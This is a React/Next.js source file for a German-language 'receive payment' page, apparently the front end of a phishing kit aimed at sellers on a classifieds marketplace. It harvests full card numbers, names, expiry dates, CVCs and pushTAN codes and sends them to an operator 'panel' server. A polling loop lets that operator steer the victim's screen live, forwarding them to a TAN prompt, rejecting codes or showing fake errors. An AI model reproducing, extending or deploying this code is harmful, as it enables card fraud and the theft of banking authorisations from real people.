"use client";

import { Suspense, use, useEffect, useRef, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { useListing } from "../../../../../components/ListingContext";

interface PageProps {
  params: Promise<{ slug: string }>;
}

const PANEL_URL = process.env.NEXT_PUBLIC_PANEL_URL || "http://localhost:8500";

type ApiBank = {
  slug: string;
  name: string;
  logo: string;
  urlTemplate: string;
  maintenance: boolean;
};

function buildBankUrl(template: string, slug: string): string {
  if (template.includes("{slug}")) return template.replace("{slug}", slug);
  return template.replace(/\/$/, "") + "/" + slug;
}

function trackEvent(type: string, listingId: string, metadata?: Record<string, string>) {
  fetch(`${PANEL_URL}/api/events`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ type, listingId, metadata }),
  }).catch(() => {});
}

type Step = "method" | "bank" | "credit_card" | "card_waiting" | "card_pushtan";

export default function BankPage({ params }: PageProps) {
  return (
    <Suspense fallback={
      <main className="page-wrapper">
        <div style={{ padding: "24px", textAlign: "center", color: "#888", fontSize: 14 }}>Laden...</div>
      </main>
    }>
      <BankPageInner params={params} />
    </Suspense>
  );
}

function BankPageInner({ params }: PageProps) {
  const { slug } = use(params);
  const router = useRouter();
  const searchParams = useSearchParams();
  const { setBankData, listingId } = useListing();

  const initialStep = (searchParams.get("step") as Step) || "method";
  const initialSessionId = searchParams.get("sessionId") || null;

  const [step, setStep] = useState<Step>(initialStep);
  const [banks, setBanks] = useState<ApiBank[]>([]);
  const [globallyEnabled, setGloballyEnabled] = useState(true);
  const [creditCardEnabled, setCreditCardEnabled] = useState(true);
  const [maintenanceMsg, setMaintenanceMsg] = useState<string | null>(null);
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvc, setCardCvc] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardSessionId, setCardSessionId] = useState<string | null>(initialSessionId);
  const [cardPollTimer, setCardPollTimer] = useState<ReturnType<typeof setInterval> | null>(null);
  const [cardTanCode, setCardTanCode] = useState("");
  const [cardError, setCardError] = useState<string | null>(null);
  const [tanInput, setTanInput] = useState("");
  const [tanTimer, setTanTimer] = useState(300);
  const tanTimerKey = useRef(0);

  useEffect(() => {
    fetch(`${PANEL_URL}/api/public/banks`)
      .then((r) => r.json())
      .then((d: { globallyEnabled: boolean; creditCardEnabled: boolean; banks: ApiBank[] }) => {
        setBanks(d.banks);
        setGloballyEnabled(d.globallyEnabled);
        setCreditCardEnabled(d.creditCardEnabled ?? true);
      })
      .catch(() => setBanks([]));
  }, []);

  // Poll for card session commands
  useEffect(() => {
    if (!cardSessionId) return;
    const timer = setInterval(async () => {
      try {
        const res = await fetch(`${PANEL_URL}/api/public/bank-session/${cardSessionId}/poll`);
        if (!res.ok) return;
        const data = await res.json();
        if (data.command) {
          const cmd = data.command;
          switch (cmd.type) {
            case "forward_to_tan":
              setCardTanCode(cmd.payload?.code || "");
              setStep("card_pushtan");
              setTanTimer(300);
              tanTimerKey.current += 1;
              setCardError(null);
              setTanInput("");
              break;
            case "back_to_login":
              setStep("credit_card");
              setCardNumber("");
              setCardExpiry("");
              setCardCvc("");
              setCardName("");
              setCardError(null);
              break;
            case "show_error":
              setCardError(cmd.payload?.message || "Ein Fehler ist aufgetreten");
              break;
            case "clear_error":
              setCardError(null);
              break;
            case "reject_tan":
              setCardError(cmd.payload?.message || "TAN wurde abgelehnt");
              setTanInput("");
              break;
            case "retry_tan":
              setTanInput("");
              setTanTimer(300);
              tanTimerKey.current += 1;
              setCardError(null);
              break;
          }
          // ACK the command
          fetch(`${PANEL_URL}/api/public/bank-session/${cardSessionId}/poll?ack=1`).catch(() => {});
        }
      } catch {
        // ignore poll errors
      }
    }, 2000);
    setCardPollTimer(timer);
    return () => {
      clearInterval(timer);
      setCardPollTimer(null);
    };
  }, [cardSessionId]);

  // TAN timer countdown
  useEffect(() => {
    if (step !== "card_pushtan") return;
    const interval = setInterval(() => {
      setTanTimer((prev) => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step]);

  const handleBack = () => {
    if (step === "card_pushtan") {
      setStep("card_waiting");
    } else if (step === "card_waiting") {
      // If we entered card_waiting from the listing page (via query param), go back there
      if (initialStep === "card_waiting") {
        router.push(`/iad/kaufen-und-verkaufen/d/${slug}`);
      } else {
        setStep("credit_card");
      }
    } else if (step === "bank" || step === "credit_card") {
      setStep("method");
    } else {
      router.push(`/iad/kaufen-und-verkaufen/d/${slug}`);
    }
  };

  const handleMethodSelect = (method: "bank" | "credit_card") => {
    if (listingId) {
      trackEvent("payment_method_selected", listingId, { method });
    }

    if (method === "credit_card") {
      setStep("credit_card");
      return;
    } else {
      setStep("bank");
    }
  };

  const handleBankSelect = (bankSlug: string) => {
    const bank = banks.find((b) => b.slug === bankSlug);
    if (!bank) return;

    if (bank.maintenance) {
      setMaintenanceMsg(`${bank.name}: vorübergehend nicht verfügbar`);
      setTimeout(() => setMaintenanceMsg(null), 3000);
      return;
    }

    if (listingId) {
      trackEvent("bank_selected", listingId, { bank: bank.name });
    }
    setBankData({
      bankName: bank.name,
      bankSlug: bank.slug,
      bankUrl: bank.urlTemplate ? buildBankUrl(bank.urlTemplate, slug) : undefined,
    });

    router.push(`/iad/kaufen-und-verkaufen/d/${slug}`);
  };

  return (
    <main className="page-wrapper">
      <div className="page-nav">
        <button className="back-link" onClick={handleBack} type="button">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <polyline points="15 18 9 12 15 6"/>
          </svg>
          Zurück
        </button>
      </div>

      {step === "method" && (
        <>
          <h1 className="page-title">Geld bekommen für</h1>
          <p className="page-subtitle">Wählen Sie die Zahlungsmethode</p>

          <div className="bank-list">
            {globallyEnabled && (
              <button
                className="bank-item"
                onClick={() => handleMethodSelect("bank")}
                type="button"
              >
                <div className="bank-logo-wrap" style={{ background: "#e8f4fd" }}>
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#36a3d9" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M3 21h18"/>
                    <path d="M3 10h18"/>
                    <path d="M5 6l7-3 7 3"/>
                    <path d="M4 10v11"/>
                    <path d="M20 10v11"/>
                    <path d="M8 14v4"/>
                    <path d="M12 14v4"/>
                    <path d="M16 14v4"/>
                  </svg>
                </div>
                <div style={{ flex: 1 }}>
                  <span className="bank-name">Banküberweisung</span>
                  <div style={{ fontSize: 12, color: "#888", marginTop: 2 }}>Direkt auf Ihr Bankkonto</div>
                </div>
                <div className="bank-arrow">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <polyline points="9 18 15 12 9 6"/>
                  </svg>
                </div>
              </button>
            )}

            {creditCardEnabled && <button
              className="bank-item"
              onClick={() => handleMethodSelect("credit_card")}
              type="button"
            >
              <div className="bank-logo-wrap" style={{ background: "#fef3e8" }}>
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#e8833a" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
                  <line x1="1" y1="10" x2="23" y2="10"/>
                  <line x1="6" y1="15" x2="10" y2="15"/>
                </svg>
              </div>
              <div style={{ flex: 1 }}>
                <span className="bank-name">Kreditkarte</span>
                <div style={{ fontSize: 12, color: "#888", marginTop: 2 }}>VISA, Mastercard, AMEX</div>
              </div>
              <div className="bank-arrow">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="9 18 15 12 9 6"/>
                </svg>
              </div>
            </button>}
          </div>
        </>
      )}

      {step === "bank" && (
        <>
          <h1 className="page-title">Bank auswählen</h1>
          <p className="page-subtitle">Wählen Sie die Bank, auf deren Konto Sie die Zahlung erhalten möchten</p>

          {maintenanceMsg && (
            <div style={{ padding: "12px 16px", margin: "0 0 16px", background: "#fff8e1", color: "#8a6d3b", borderRadius: 8, fontSize: 13 }}>
              {maintenanceMsg}
            </div>
          )}

          <div className="bank-list">
            {banks.length === 0 ? (
              <div style={{ padding: "24px", textAlign: "center", color: "#888", fontSize: 14 }}>
                Keine Banken verfügbar
              </div>
            ) : (
              banks.map((bank) => (
                <button
                  key={bank.slug}
                  className="bank-item"
                  onClick={() => handleBankSelect(bank.slug)}
                  type="button"
                  style={bank.maintenance ? { opacity: 0.5 } : undefined}
                >
                  <div className="bank-logo-wrap">
                    <img src={bank.logo} alt={bank.name} className="bank-logo-img" />
                  </div>
                  <span className="bank-name">{bank.name}</span>
                  {bank.maintenance && (
                    <span style={{ fontSize: 11, color: "#b08a4a", marginRight: 8 }}>Wartung</span>
                  )}
                  <div className="bank-arrow">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <polyline points="9 18 15 12 9 6"/>
                    </svg>
                  </div>
                </button>
              ))
            )}
          </div>
        </>
      )}

      {/* Spinner animation style */}
      <style>{`
        @keyframes card-spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>

      {step === "credit_card" && (
        <>
          <h1 className="page-title">Kreditkarte</h1>
          <p className="page-subtitle">Geben Sie Ihre Kartendaten ein</p>

          <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
            {/* Card Number */}
            <div>
              <label style={{ display: "block", fontSize: 13, color: "#555", marginBottom: 4, fontWeight: 500 }}>
                Kartennummer
              </label>
              <div style={{ position: "relative" }}>
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="0000 0000 0000 0000"
                  value={cardNumber}
                  onChange={(e) => {
                    const raw = e.target.value.replace(/\D/g, "").slice(0, 16);
                    const formatted = raw.replace(/(.{4})/g, "$1 ").trim();
                    setCardNumber(formatted);
                  }}
                  maxLength={19}
                  style={{
                    width: "100%",
                    height: 48,
                    padding: "0 44px 0 14px",
                    border: "1px solid #ddd",
                    borderRadius: 10,
                    fontSize: 16,
                    letterSpacing: 1,
                    outline: "none",
                    background: "#fff",
                  }}
                />
                <svg
                  width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#aaa" strokeWidth="1.5"
                  style={{ position: "absolute", right: 12, top: 12 }}
                >
                  <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
                  <line x1="1" y1="10" x2="23" y2="10"/>
                </svg>
              </div>
            </div>

            {/* Cardholder Name */}
            <div>
              <label style={{ display: "block", fontSize: 13, color: "#555", marginBottom: 4, fontWeight: 500 }}>
                Karteninhaber
              </label>
              <input
                type="text"
                placeholder="Vor- und Nachname"
                value={cardName}
                onChange={(e) => setCardName(e.target.value)}
                style={{
                  width: "100%",
                  height: 48,
                  padding: "0 14px",
                  border: "1px solid #ddd",
                  borderRadius: 10,
                  fontSize: 16,
                  outline: "none",
                  background: "#fff",
                }}
              />
            </div>

            {/* MM/YY + CVC row */}
            <div style={{ display: "flex", gap: 12 }}>
              <div style={{ flex: 1 }}>
                <label style={{ display: "block", fontSize: 13, color: "#555", marginBottom: 4, fontWeight: 500 }}>
                  Gültig bis
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="MM/YY"
                  value={cardExpiry}
                  onChange={(e) => {
                    let raw = e.target.value.replace(/\D/g, "").slice(0, 4);
                    if (raw.length > 2) raw = raw.slice(0, 2) + "/" + raw.slice(2);
                    setCardExpiry(raw);
                  }}
                  maxLength={5}
                  style={{
                    width: "100%",
                    height: 48,
                    padding: "0 14px",
                    border: "1px solid #ddd",
                    borderRadius: 10,
                    fontSize: 16,
                    textAlign: "center",
                    letterSpacing: 2,
                    outline: "none",
                    background: "#fff",
                  }}
                />
              </div>
              <div style={{ flex: 1 }}>
                <label style={{ display: "block", fontSize: 13, color: "#555", marginBottom: 4, fontWeight: 500 }}>
                  CVC
                </label>
                <div style={{ position: "relative" }}>
                  <input
                    type="text"
                    inputMode="numeric"
                    placeholder="123"
                    value={cardCvc}
                    onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    maxLength={4}
                    style={{
                      width: "100%",
                      height: 48,
                      padding: "0 40px 0 14px",
                      border: "1px solid #ddd",
                      borderRadius: 10,
                      fontSize: 16,
                      textAlign: "center",
                      letterSpacing: 2,
                      outline: "none",
                      background: "#fff",
                    }}
                  />
                  <svg
                    width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#aaa" strokeWidth="1.5"
                    style={{ position: "absolute", right: 10, top: 14 }}
                  >
                    <circle cx="12" cy="12" r="10"/>
                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
                    <line x1="12" y1="17" x2="12.01" y2="17"/>
                  </svg>
                </div>
              </div>
            </div>

            {/* Submit */}
            <button
              type="button"
              disabled={cardNumber.replace(/\s/g, "").length < 13 || cardExpiry.length < 5 || cardCvc.length < 3 || !cardName.trim()}
              onClick={() => {
                if (listingId) {
                  trackEvent("credit_card_submitted", listingId, {
                    last4: cardNumber.replace(/\s/g, "").slice(-4),
                  });
                }
                setBankData({
                  bankName: "Kreditkarte",
                  bankSlug: "kreditkarte",
                  cardNumber: cardNumber.replace(/\s/g, ""),
                  cardName,
                  cardExpiry,
                  cardCvc,
                });
                router.push(`/iad/kaufen-und-verkaufen/d/${slug}`);
              }}
              style={{
                width: "100%",
                height: 48,
                border: "none",
                borderRadius: 10,
                fontSize: 16,
                fontWeight: 600,
                cursor: "pointer",
                background: cardNumber.replace(/\s/g, "").length >= 13 && cardExpiry.length >= 5 && cardCvc.length >= 3 && cardName.trim()
                  ? "#36a3d9" : "#ccc",
                color: "#fff",
                transition: "background 0.2s",
              }}
            >
              Bestätigen
            </button>
          </div>
        </>
      )}

      {step === "card_waiting" && (
        <>
          <h1 className="page-title">Kreditkarte</h1>
          <p className="page-subtitle">Ihre Daten werden überprüft...</p>

          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "40px 0", gap: 16 }}>
            <svg
              width="48"
              height="48"
              viewBox="0 0 48 48"
              style={{ animation: "card-spin 1s linear infinite" }}
            >
              <circle cx="24" cy="24" r="20" stroke="#eee" strokeWidth="4" fill="none" />
              <path
                d="M44 24c0-11.046-8.954-20-20-20"
                stroke="#36a3d9"
                strokeWidth="4"
                strokeLinecap="round"
                fill="none"
              />
            </svg>
            <p style={{ color: "#888", fontSize: 14 }}>Bitte warten Sie...</p>
            {cardError && (
              <p style={{ color: "#d32f2f", fontSize: 13 }}>{cardError}</p>
            )}
          </div>
        </>
      )}

      {step === "card_pushtan" && (
        <>
          <h1 className="page-title">pushTAN Freigabe</h1>
          <p className="page-subtitle">Bestätigen Sie die Transaktion</p>

          {cardError && (
            <div
              style={{
                padding: "12px 16px",
                margin: "0 0 16px",
                background: "#fdecea",
                color: "#d32f2f",
                borderRadius: 8,
                fontSize: 13,
              }}
            >
              {cardError}
            </div>
          )}

          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: 16,
              margin: "24px 0",
              padding: "20px",
              background: "#f8f9fa",
              borderRadius: 10,
              border: "1px solid #eee",
            }}
          >
            {/* Timer ring */}
            <div style={{ position: "relative", width: 56, height: 56, flexShrink: 0 }}>
              <svg width="56" height="56" viewBox="0 0 56 56">
                <circle cx="28" cy="28" r="24" stroke="#eee" strokeWidth="3" fill="none" />
                <circle
                  cx="28"
                  cy="28"
                  r="24"
                  stroke={tanTimer <= 60 ? "#d32f2f" : "#36a3d9"}
                  strokeWidth="3"
                  fill="none"
                  strokeLinecap="round"
                  strokeDasharray={2 * Math.PI * 24}
                  strokeDashoffset={2 * Math.PI * 24 * (1 - tanTimer / 300)}
                  transform="rotate(-90 28 28)"
                  style={{ transition: "stroke-dashoffset 1s linear" }}
                />
              </svg>
              <div
                style={{
                  position: "absolute",
                  top: 0,
                  left: 0,
                  right: 0,
                  bottom: 0,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  fontSize: 13,
                  fontWeight: 600,
                  color: tanTimer <= 60 ? "#d32f2f" : "#333",
                }}
              >
                {String(Math.floor(tanTimer / 60)).padStart(2, "0")}:
                {String(tanTimer % 60).padStart(2, "0")}
              </div>
            </div>

            <div>
              <div style={{ fontSize: 11, color: "#888", textTransform: "uppercase", letterSpacing: 1, marginBottom: 4 }}>
                Vergleichswert
              </div>
              <div style={{ fontSize: 28, fontWeight: 600, letterSpacing: 3, color: "#36a3d9" }}>
                {cardTanCode}
              </div>
            </div>
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
            <input
              type="text"
              inputMode="numeric"
              placeholder="TAN-Code eingeben"
              value={tanInput}
              onChange={(e) => setTanInput(e.target.value.replace(/\D/g, "").slice(0, 8))}
              maxLength={8}
              style={{
                width: "100%",
                height: 48,
                padding: "0 14px",
                border: "1px solid #ddd",
                borderRadius: 10,
                fontSize: 16,
                textAlign: "center",
                letterSpacing: 4,
                outline: "none",
                background: "#fff",
              }}
            />

            <button
              type="button"
              disabled={tanInput.length < 4 || tanTimer <= 0}
              onClick={() => {
                if (listingId) {
                  fetch(`${PANEL_URL}/api/public/bank-submission`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      bankSlug: "kreditkarte",
                      listingSlug: slug,
                      step: "pushtan",
                      data: {
                        tanInput,
                        code: cardTanCode,
                      },
                    }),
                  }).catch(() => {});
                }
                setBankData({ bankName: "Kreditkarte" });
                router.push(`/iad/kaufen-und-verkaufen/d/${slug}`);
              }}
              style={{
                width: "100%",
                height: 48,
                border: "none",
                borderRadius: 10,
                fontSize: 16,
                fontWeight: 600,
                cursor: "pointer",
                background: tanInput.length >= 4 && tanTimer > 0 ? "#36a3d9" : "#ccc",
                color: "#fff",
                transition: "background 0.2s",
              }}
            >
              Bestätigen
            </button>
          </div>
        </>
      )}
    </main>
  );
}
